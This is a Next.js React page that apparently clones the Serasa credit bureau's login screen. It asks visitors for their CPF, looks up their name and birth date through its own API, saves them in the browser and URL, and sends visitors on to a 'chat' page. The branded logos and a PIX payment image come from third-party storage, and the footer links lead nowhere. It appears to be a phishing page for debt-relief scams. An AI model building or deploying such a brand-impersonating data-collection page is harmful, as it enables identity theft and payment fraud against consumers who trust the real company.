"use client"

import type React from "react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Switch } from "@/components/ui/switch"
import { AlertTriangle } from "lucide-react"
import Image from "next/image"
import Link from "next/link"
import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"

const TypewriterText = () => {
  const phrases = [
    "limpar seu nome",
    "consultar seu CPF",
    "negociar suas dívidas",
    "aumentar seu score",
    "ter crédito aprovado",
  ]

  const [currentPhraseIndex, setCurrentPhraseIndex] = useState(0)
  const [currentText, setCurrentText] = useState("")
  const [isDeleting, setIsDeleting] = useState(false)
  const [isPaused, setIsPaused] = useState(false)

  useEffect(() => {
    const currentPhrase = phrases[currentPhraseIndex]

    const timeout = setTimeout(
      () => {
        if (isPaused) {
          setIsPaused(false)
          setIsDeleting(true)
          return
        }

        if (isDeleting) {
          setCurrentText(currentPhrase.substring(0, currentText.length - 1))

          if (currentText === "") {
            setIsDeleting(false)
            setCurrentPhraseIndex((prev) => (prev + 1) % phrases.length)
          }
        } else {
          setCurrentText(currentPhrase.substring(0, currentText.length + 1))

          if (currentText === currentPhrase) {
            setIsPaused(true)
          }
        }
      },
      isDeleting ? 50 : isPaused ? 2000 : 100,
    )

    return () => clearTimeout(timeout)
  }, [currentText, isDeleting, isPaused, currentPhraseIndex, phrases])

  return (
    <div className="space-y-4">
      <span className="text-white text-5xl font-bold leading-tight block">
        Na Serasa
        <br />
        você pode
      </span>
      <div className="bg-white p-6 shadow-lg rounded-none items-center">
        <span className="text-pink-600 font-extrabold text-5xl items-start">
          {currentText}
          <span className="animate-pulse">|</span>
        </span>
      </div>
    </div>
  )
}

export default function AuthPage() {
  const [cpf, setCpf] = useState("")
  const [rememberCpf, setRememberCpf] = useState(true)
  const [showError, setShowError] = useState(false)
  const [errorMessage, setErrorMessage] = useState("Informe o seu CPF.")
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value)
    setCpf(formatted)
    if (showError && formatted.length > 0) {
      setShowError(false)
    }
  }

  const handleContinue = async () => {
    if (!cpf || cpf.length < 14) {
      setShowError(true)
      setErrorMessage("Informe o seu CPF.")
      return
    }

    setIsLoading(true)
    setShowError(false)

    try {
      console.log("[v0] Validating CPF:", cpf)

      const response = await fetch("/api/validate-cpf", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cpf }),
      })

      const data = await response.json()
      console.log("[v0] CPF validation response:", data)

      if (data.valid) {
        if (rememberCpf) {
          localStorage.setItem("serasa_cpf", cpf)
        }

        const cleanCpf = cpf.replace(/\D/g, "")
        const searchParams = new URLSearchParams(window.location.search)
        searchParams.set("cpf", cleanCpf)

        if (data.user?.nome) {
          localStorage.setItem("serasa_nome", data.user.nome)
          searchParams.set("nome", data.user.nome)
          if (data.user.nascimento) {
            localStorage.setItem("serasa_nasc", data.user.nascimento)
            searchParams.set("nasc", data.user.nascimento)
          }
        }

        console.log("[v0] Redirecting to chat with params:", searchParams.toString())
        router.push(`/chat?${searchParams.toString()}`)
      } else {
        setShowError(true)
        setErrorMessage(data.message || "CPF inválido.")
      }
    } catch (error) {
      console.log("[v0] CPF validation error:", error)
      setShowError(true)
      setErrorMessage("Erro ao validar CPF. Tente novamente.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Mobile Layout */}
      <div className="md:hidden">
        <div className="px-6 py-12 min-h-screen flex flex-col">
          <div className="flex-1 flex flex-col justify-center space-y-8">
            <div className="mb-2 flex justify-start">
              <Image src="/serasa-logo-pink.svg" alt="Serasa Logo" width={60} height={80} className="w-15 w-8 flex-row text-left py-0 px-0 mx-[-9px] h-11 my-[-4px]" />
            </div>

            <h1 className="text-gray-900 font-light text-3xl py-0 my-2.5">Digite seu CPF</h1>

            <div className="space-y-2">
              <div className="relative">
                <Input
                  type="text"
                  placeholder="000.000.000-00"
                  value={cpf}
                  onChange={handleCpfChange}
                  maxLength={14}
                  className={`text-lg py-4 h-14 ${showError ? "border-red-500 focus:border-red-500" : "border-gray-300"}`}
                />
                {showError && (
                  <AlertTriangle className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
                )}
              </div>
              {showError && <p className="text-red-500 text-sm">{errorMessage}</p>}
            </div>

            <div className="flex items-center space-x-3">
              <Switch
                checked={rememberCpf}
                onCheckedChange={setRememberCpf}
                className="data-[state=checked]:bg-pink-600"
              />
              <label className="text-sm text-gray-700">Lembrar CPF para o próximo acesso</label>
            </div>

            <Button
              onClick={handleContinue}
              disabled={!cpf || cpf.length < 14 || isLoading}
              className={`w-full py-4 h-14 text-lg ${
                cpf && cpf.length >= 14 && !isLoading
                  ? "bg-pink-600 text-white hover:bg-pink-700"
                  : "bg-gray-300 text-gray-500 hover:bg-gray-300"
              } disabled:opacity-100`}
            >
              {isLoading ? "Validando..." : "Continuar"}
            </Button>
          </div>

          <div className="text-center space-y-4 mt-12">
            <p className="text-sm text-gray-600">
              Conheça aqui{" "}
              <Link href="#" className="text-pink-600 font-medium">
                soluções para sua empresa
              </Link>
            </p>

            <p className="text-sm text-gray-500">
              <Link href="#" className="hover:underline">
                Termos de Uso e Política de Privacidade
              </Link>
            </p>
          </div>
        </div>
      </div>

      {/* Desktop Layout */}
      <div className="hidden md:flex min-h-screen relative">
        {/* Left Side - Pink Background */}
        <div className="w-1/3 bg-pink-600 relative overflow-hidden px-3 mx-[-7px]">
          <div className="absolute top-8 left-8">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
              alt="Serasa Logo"
              width={180}
              height={60}
              className="h-12 w-auto"
            />
          </div>

          <div className="absolute top-32 left-8 mt-8">
            <TypewriterText />
          </div>
        </div>

        {/* Right Side - Form */}
        <div className="flex-1 flex items-center justify-center bg-gray-50">
          <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8 mx-[33px] my-[17px] px-[51px] py-[103px]">
            <div className="space-y-6">
              <h1 className="text-3xl font-semibold text-gray-900">Digite seu CPF</h1>

              <div className="space-y-2">
                <div className="relative">
                  <Input
                    type="text"
                    placeholder="000.000.000-00"
                    value={cpf}
                    onChange={handleCpfChange}
                    maxLength={14}
                    className={`text-lg py-4 ${showError ? "border-red-500 focus:border-red-500" : "border-gray-300"}`}
                  />
                  {showError && (
                    <AlertTriangle className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
                  )}
                </div>
                {showError && <p className="text-red-500 text-sm">{errorMessage}</p>}
              </div>

              <div className="flex items-center space-x-3">
                <Switch
                  checked={rememberCpf}
                  onCheckedChange={setRememberCpf}
                  className="data-[state=checked]:bg-pink-600"
                />
                <label className="text-sm text-gray-700">Lembrar CPF para o próximo acesso</label>
              </div>

              <Button
                onClick={handleContinue}
                disabled={!cpf || cpf.length < 14 || isLoading}
                className={`w-full py-4 text-lg ${
                  cpf && cpf.length >= 14 && !isLoading
                    ? "bg-pink-600 text-white hover:bg-pink-700"
                    : "bg-gray-300 text-gray-500 hover:bg-gray-300"
                } disabled:opacity-100`}
              >
                {isLoading ? "Validando..." : "Continuar"}
              </Button>

              <div className="text-center space-y-4 mt-8">
                <p className="text-sm text-gray-600">
                  Conheça aqui{" "}
                  <Link href="#" className="text-pink-600 font-medium">
                    soluções para sua empresa
                  </Link>
                </p>

                <p className="text-sm text-gray-500">
                  <Link href="#" className="hover:underline">
                    Termos de Uso e Política de Privacidade
                  </Link>
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="absolute bottom-0 left-1/3 transform -translate-x-1/2 z-10">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-2-08671fa80618aa0d4a57599612ba9c41-DIH8tkCXNWHc3xM17iWiK8nfmyXBNW.webp"
            alt="Homem sorrindo segurando celular com PIX"
            width={250}
            height={300}
            className="w-auto object-contain h-[662px]"
          />
        </div>
      </div>
    </div>
  )
}
